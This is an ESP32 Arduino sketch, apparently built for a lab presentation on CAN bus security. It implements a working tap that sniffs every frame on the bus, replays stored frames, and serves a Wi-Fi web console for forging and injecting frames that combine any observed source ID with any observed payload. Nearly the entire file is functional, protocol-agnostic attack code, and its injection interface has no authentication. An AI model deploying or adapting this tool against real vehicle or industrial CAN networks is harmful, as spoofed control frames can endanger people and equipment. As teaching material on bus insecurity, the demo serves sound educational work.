/*
  ESP3 - BLIND CAN BUS TAP / SNIFFER / REPLAY NODE
  ---------------------------------------------------
  This node has ZERO built-in knowledge of any CAN ID or what any
  byte means. It does exactly three things, generically, for ANY
  frame on the bus:
    1. Capture every frame the instant it appears (real time)
    2. Store the raw id/dlc/data bytes in a ring buffer
    3. On request from the webpage, retransmit (replay) the exact
       stored bytes

  There is no #define for LED_CTRL_ID, no parsing of any payload
  meaning, no labels. If you change ESP1/ESP2's protocol entirely,
  this code does not need to change at all - that's the point: a
  tap doesn't need to understand a protocol to be dangerous to it.

  HARDWARE: same CAN wiring as ESP1/ESP2 (GPIO21 TX, GPIO22 RX into
  the transceiver, tapped onto the same CAN_H/CAN_L lines).

  NOTE ON MODE: runs TWAI_MODE_NORMAL (not LISTEN_ONLY) so it can
  transmit for replay. It will ACK frames like a real node - that's
  a fine talking point for your presentation (a fully invisible
  listen-only tap could not replay without switching modes).

  LIBRARIES NEEDED: ESPAsyncWebServer, AsyncTCP (ESP32 build)
*/

#include <Arduino.h>
#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include "driver/twai.h"

#define CAN_TX GPIO_NUM_21
#define CAN_RX GPIO_NUM_22

const char *AP_SSID     = "CAN-TAP-LAB";
const char *AP_PASSWORD = "sniffmeout"; // 8+ chars required

AsyncWebServer server(80);
AsyncWebSocket ws("/ws");

struct CapturedFrame {
  uint32_t id;
  uint8_t  dlc;
  uint8_t  data[8];
  uint32_t ts;
};

#define MAX_LOG 100
CapturedFrame logBuf[MAX_LOG];
volatile int logCount = 0;
int logHead = 0;

// ---------- Wire protocol: FRAME|<id_hex>|<dlc>|<data_hex_csv>|<ts>
//            browser -> ESP3: REPLAY|<id_hex>|<dlc>|<data_hex_csv>
// No label field anywhere - ESP3 never attaches meaning to anything.

String frameToWireString(const CapturedFrame &f) {
  char hexId[8];
  snprintf(hexId, sizeof(hexId), "0x%03lX", (unsigned long)f.id);

  String dataCsv = "";
  for (int i = 0; i < f.dlc; i++) {
    char b[4];
    snprintf(b, sizeof(b), "%02X", f.data[i]);
    dataCsv += b;
    if (i < f.dlc - 1) dataCsv += ",";
  }

  String out = "FRAME|";
  out += hexId; out += "|";
  out += String(f.dlc); out += "|";
  out += dataCsv; out += "|";
  out += String(f.ts);
  return out;
}

void broadcastFrame(const CapturedFrame &f) {
  ws.textAll(frameToWireString(f));
}

void storeFrame(const CapturedFrame &f) {
  logBuf[logHead] = f;
  logHead = (logHead + 1) % MAX_LOG;
  if (logCount < MAX_LOG) logCount++;
}

// ---------- CAN capture task: pure byte capture, no interpretation ----------
void canCaptureTask(void *param) {
  for (;;) {
    twai_message_t rx;
    if (twai_receive(&rx, pdMS_TO_TICKS(50)) == ESP_OK) {
      if (rx.extd || rx.rtr) continue; // standard data frames only, for this demo

      CapturedFrame f;
      f.id  = rx.identifier;
      f.dlc = rx.data_length_code;
      memcpy(f.data, rx.data, rx.data_length_code);
      f.ts  = millis();

      storeFrame(f);
      broadcastFrame(f);

      Serial.printf("CAPTURED | ID: 0x%03lX | DLC: %u\n", (unsigned long)f.id, f.dlc);
    }
  }
}

// ---------- Replay: blind retransmission of exactly what's asked ----------
void replayFrame(uint32_t id, uint8_t dlc, uint8_t *data) {
  twai_message_t msg = {};
  msg.identifier = id;
  msg.data_length_code = dlc;
  memcpy(msg.data, data, dlc);
  msg.ss = 1;

  esp_err_t res = twai_transmit(&msg, pdMS_TO_TICKS(100));
  Serial.printf("REPLAY %s | ID: 0x%03lX | DLC: %u\n",
                (res == ESP_OK) ? "OK" : "FAILED", (unsigned long)id, dlc);
}

void handleWsMessage(const String &msg) {
  if (!msg.startsWith("REPLAY|")) return;

  int p1 = msg.indexOf('|', 7);
  String idStr  = msg.substring(7, p1);
  int p2 = msg.indexOf('|', p1 + 1);
  String dlcStr = msg.substring(p1 + 1, p2);
  String dataStr = msg.substring(p2 + 1);

  uint32_t id = strtoul(idStr.c_str(), nullptr, 16);
  uint8_t dlc = (uint8_t)dlcStr.toInt();

  uint8_t data[8] = {0};
  int idx = 0, start = 0;
  while (idx < dlc && start < (int)dataStr.length()) {
    int comma = dataStr.indexOf(',', start);
    String byteStr = (comma == -1) ? dataStr.substring(start) : dataStr.substring(start, comma);
    data[idx++] = (uint8_t)strtoul(byteStr.c_str(), nullptr, 16);
    if (comma == -1) break;
    start = comma + 1;
  }

  replayFrame(id, dlc, data);
}

void onWsEvent(AsyncWebSocket *server, AsyncWebSocketClient *client,
               AwsEventType type, void *arg, uint8_t *data, size_t len) {
  if (type == WS_EVT_CONNECT) {
    Serial.printf("WS client connected: %u\n", client->id());
    for (int i = 0; i < logCount; i++) {
      int idx = (logHead - logCount + i + MAX_LOG) % MAX_LOG;
      client->text(frameToWireString(logBuf[idx]));
    }
  } else if (type == WS_EVT_DATA) {
    AwsFrameInfo *info = (AwsFrameInfo *)arg;
    if (info->final && info->index == 0 && info->len == len && info->opcode == WS_TEXT) {
      String msg((char *)data, len);
      handleWsMessage(msg);
    }
  }
}

// ---------- Webpage: raw id/dlc/data only (no decoding), split into
// ID feed + payload feed so they can be freely recombined ("forged")
// into a frame that was never actually sent together on the bus.
const char INDEX_HTML[] PROGMEM = R"HTMLPAGE(
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>CAN-TAP :: intercept console</title>
<style>
  :root { color-scheme: dark; }
  * { box-sizing: border-box; }
  body {
    font-family: ui-monospace, "Courier New", monospace;
    background: #050806;
    color: #39ff6a;
    margin: 0;
    padding: 18px;
    background-image:
      repeating-linear-gradient(0deg, rgba(0,255,70,0.035) 0px, rgba(0,255,70,0.035) 1px, transparent 1px, transparent 3px);
  }
  .glow { text-shadow: 0 0 6px rgba(57,255,106,0.55); }
  h1 {
    font-size: 1.15rem; margin: 0 0 2px; letter-spacing: 1px;
  }
  .prompt { color: #8affb0; }
  .sub { color:#2f7a46; font-size:0.78rem; margin-bottom:14px; }
  #status {
    display:inline-block; font-size:0.75rem; padding:3px 8px;
    border:1px solid #1f5c33; border-radius:3px; margin-bottom:16px;
  }
  .ok  { color:#39ff6a; border-color:#1f5c33 !important; }
  .bad { color:#ff4f4f; border-color:#5c1f1f !important; animation: blink 1s infinite; }
  @keyframes blink { 50% { opacity: 0.35; } }

  .panel {
    border: 1px solid #16331f;
    border-radius: 4px;
    margin-bottom: 16px;
    background: rgba(10,20,13,0.5);
  }
  .panel h2 {
    font-size: 0.8rem; margin: 0; padding: 8px 10px;
    border-bottom: 1px solid #16331f; color:#8affb0; letter-spacing:0.5px;
  }
  .panel-body { padding: 8px 10px; max-height: 240px; overflow-y:auto; }

  table { width:100%; border-collapse: collapse; font-size:0.82rem; }
  th, td { text-align:left; padding:5px 8px; border-bottom:1px solid #122118; }
  th { color:#2f7a46; font-weight:600; font-size:0.72rem; text-transform:uppercase; }
  tr:hover td { background:#0d1a10; }
  .idval { color:#7dd3fc; }
  .dataval { color:#ffe066; }

  .pickrow { cursor: pointer; }
  .pickrow.selected td { background:#123a1e !important; outline:1px solid #39ff6a; }
  .pickrow:hover td { background:#0f2415; }

  button {
    background: transparent; color:#39ff6a; border:1px solid #1f5c33;
    border-radius:3px; padding:4px 9px; font-size:0.72rem; cursor:pointer;
    font-family: inherit;
  }
  button:hover { background:#122a19; }
  button.danger { color:#ff6b6b; border-color:#5c1f1f; }
  button.danger:hover { background:#2a1212; }
  button:disabled { opacity:0.3; cursor:not-allowed; }

  .forge-grid { display:grid; grid-template-columns: 1fr 1fr; gap:10px; }
  .forge-slot {
    border:1px dashed #1f5c33; border-radius:4px; padding:8px; min-height:50px;
    font-size:0.8rem;
  }
  .forge-slot .tag { color:#2f7a46; font-size:0.68rem; text-transform:uppercase; display:block; margin-bottom:4px; }
  .forge-slot .val { color:#39ff6a; }
  .forge-empty { color:#3a5a44; font-style:italic; }
  .inject-btn {
    width:100%; margin-top:10px; padding:8px; font-size:0.85rem;
    background:#102b17; border:1px solid #39ff6a; letter-spacing:1px;
  }
  .inject-btn:hover:not(:disabled) { background:#184024; }

  .empty { color:#2f5e3c; font-size:0.78rem; font-style:italic; padding:6px 0; }
  .log-entry { font-size:0.74rem; color:#2f7a46; margin-bottom:3px; }
  .log-entry .idval { font-size:0.74rem; }
</style>
</head>
<body>
  <h1 class="glow"><span class="prompt">root@can-tap:~$</span> ./intercept --mode=passive</h1>
  <div class="sub">zero footprint tap &middot; no frame IDs known in advance &middot; mix any source with any payload to forge a frame</div>
  <div id="status">[ UPLINK: CONNECTING... ]</div>

  <div class="panel">
    <h2>&gt; FORGE A FRAME</h2>
    <div class="panel-body">
      <div class="forge-grid">
        <div class="forge-slot" id="slotId"><span class="tag">source id</span><span class="val forge-empty">click an ID below</span></div>
        <div class="forge-slot" id="slotData"><span class="tag">payload</span><span class="val forge-empty">click a payload below</span></div>
      </div>
      <button class="inject-btn" id="injectBtn" disabled>[ INJECT FORGED FRAME ]</button>
    </div>
  </div>

  <div class="panel">
    <h2>&gt; SOURCE IDs SEEN ON BUS</h2>
    <div class="panel-body">
      <table><thead><tr><th>ID</th><th>Last seen</th><th>Hits</th></tr></thead>
      <tbody id="idRows"></tbody></table>
      <div class="empty" id="idEmpty">-- listening, no traffic yet --</div>
    </div>
  </div>

  <div class="panel">
    <h2>&gt; PAYLOADS SEEN ON BUS</h2>
    <div class="panel-body">
      <table><thead><tr><th>DLC</th><th>Data (hex)</th><th>Hits</th></tr></thead>
      <tbody id="dataRows"></tbody></table>
      <div class="empty" id="dataEmpty">-- listening, no traffic yet --</div>
    </div>
  </div>

  <div class="panel">
    <h2>&gt; LIVE INTERCEPT LOG</h2>
    <div class="panel-body" id="logBody">
      <div class="empty">-- waiting for first frame --</div>
    </div>
  </div>

<script>
let ws;
const statusEl = document.getElementById('status');
const idRows = document.getElementById('idRows');
const dataRows = document.getElementById('dataRows');
const idEmpty = document.getElementById('idEmpty');
const dataEmpty = document.getElementById('dataEmpty');
const logBody = document.getElementById('logBody');
const slotId = document.getElementById('slotId');
const slotData = document.getElementById('slotData');
const injectBtn = document.getElementById('injectBtn');

const idMap = new Map();   // id -> {lastTs, hits, el}
const dataMap = new Map(); // "dlc:csv" -> {dlc, csv, lastTs, hits, el}
let selectedId = null;
let selectedData = null; // {dlc, csv}
let logCount = 0;

function connect() {
  ws = new WebSocket('ws://' + location.host + '/ws');
  ws.onopen = () => { statusEl.textContent = '[ UPLINK: CONNECTED ]'; statusEl.className = 'ok'; };
  ws.onclose = () => { statusEl.textContent = '[ UPLINK: LOST - retrying... ]'; statusEl.className = 'bad'; setTimeout(connect, 1000); };
  ws.onmessage = (ev) => {
    const parts = ev.data.split('|');
    if (parts[0] !== 'FRAME') return;
    const [, id, dlc, dataCsv, ts] = parts;
    onFrame(id, dlc, dataCsv || '', ts);
  };
}

function onFrame(id, dlc, dataCsv, ts) {
  logFrame(id, dlc, dataCsv, ts);
  upsertId(id, ts);
  upsertData(dlc, dataCsv, ts);
}

function logFrame(id, dlc, dataCsv, ts) {
  if (logCount === 0) logBody.innerHTML = '';
  const div = document.createElement('div');
  div.className = 'log-entry';
  div.innerHTML = `[${(ts/1000).toFixed(1)}s] id=<span class="idval">${id}</span> dlc=${dlc} data=<span class="dataval">${dataCsv || '-'}</span>`;
  logBody.prepend(div);
  logCount++;
  while (logBody.children.length > 60) logBody.removeChild(logBody.lastChild);
}

function upsertId(id, ts) {
  if (!idMap.has(id)) {
    idEmpty.style.display = 'none';
    const tr = document.createElement('tr');
    tr.className = 'pickrow';
    tr.innerHTML = `<td class="idval">${id}</td><td class="lastTs">${(ts/1000).toFixed(1)}s</td><td class="hits">1</td>`;
    tr.onclick = () => selectId(id);
    idRows.prepend(tr);
    idMap.set(id, { hits: 1, el: tr });
  } else {
    const rec = idMap.get(id);
    rec.hits++;
    rec.el.querySelector('.lastTs').textContent = (ts/1000).toFixed(1) + 's';
    rec.el.querySelector('.hits').textContent = rec.hits;
  }
}

function upsertData(dlc, dataCsv, ts) {
  const key = dlc + ':' + dataCsv;
  if (!dataMap.has(key)) {
    dataEmpty.style.display = 'none';
    const tr = document.createElement('tr');
    tr.className = 'pickrow';
    tr.innerHTML = `<td>${dlc}</td><td class="dataval">${dataCsv || '-'}</td><td class="hits">1</td>`;
    tr.onclick = () => selectData(dlc, dataCsv);
    dataRows.prepend(tr);
    dataMap.set(key, { dlc, csv: dataCsv, hits: 1, el: tr });
  } else {
    const rec = dataMap.get(key);
    rec.hits++;
    rec.el.querySelector('.hits').textContent = rec.hits;
  }
}

function selectId(id) {
  selectedId = id;
  document.querySelectorAll('#idRows tr').forEach(r => r.classList.remove('selected'));
  idMap.get(id).el.classList.add('selected');
  slotId.innerHTML = `<span class="tag">source id</span><span class="val idval">${id}</span>`;
  updateInjectState();
}

function selectData(dlc, csv) {
  selectedData = { dlc, csv };
  document.querySelectorAll('#dataRows tr').forEach(r => r.classList.remove('selected'));
  dataMap.get(dlc + ':' + csv).el.classList.add('selected');
  slotData.innerHTML = `<span class="tag">payload</span><span class="val dataval">dlc=${dlc} [${csv || '-'}]</span>`;
  updateInjectState();
}

function updateInjectState() {
  injectBtn.disabled = !(selectedId && selectedData);
}

injectBtn.onclick = () => {
  if (!selectedId || !selectedData) return;
  ws.send(`REPLAY|${selectedId}|${selectedData.dlc}|${selectedData.csv}`);
  injectBtn.textContent = '[ INJECTED ]';
  setTimeout(() => { injectBtn.textContent = '[ INJECT FORGED FRAME ]'; }, 600);
};

connect();
</script>
</body>
</html>
)HTMLPAGE";

void setup() {
  Serial.begin(115200);
  delay(300);

  twai_general_config_t g = TWAI_GENERAL_CONFIG_DEFAULT(CAN_TX, CAN_RX, TWAI_MODE_NORMAL);
  twai_timing_config_t t = TWAI_TIMING_CONFIG_250KBITS();
  twai_filter_config_t f = TWAI_FILTER_CONFIG_ACCEPT_ALL();

  if (twai_driver_install(&g, &t, &f) != ESP_OK || twai_start() != ESP_OK) {
    Serial.println("CAN setup failed");
    while (true) delay(1000);
  }

  WiFi.softAP(AP_SSID, AP_PASSWORD);
  Serial.print("AP started. Connect to SSID: ");
  Serial.println(AP_SSID);
  Serial.print("Then browse to: http://");
  Serial.println(WiFi.softAPIP());

  ws.onEvent(onWsEvent);
  server.addHandler(&ws);

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send_P(200, "text/html", INDEX_HTML);
  });

  server.begin();

  xTaskCreatePinnedToCore(canCaptureTask, "canCapture", 4096, nullptr, 1, nullptr, 1);

  Serial.println("ESP3 - BLIND CAN TAP READY");
}

void loop() {
  ws.cleanupClients();
  delay(10);
}
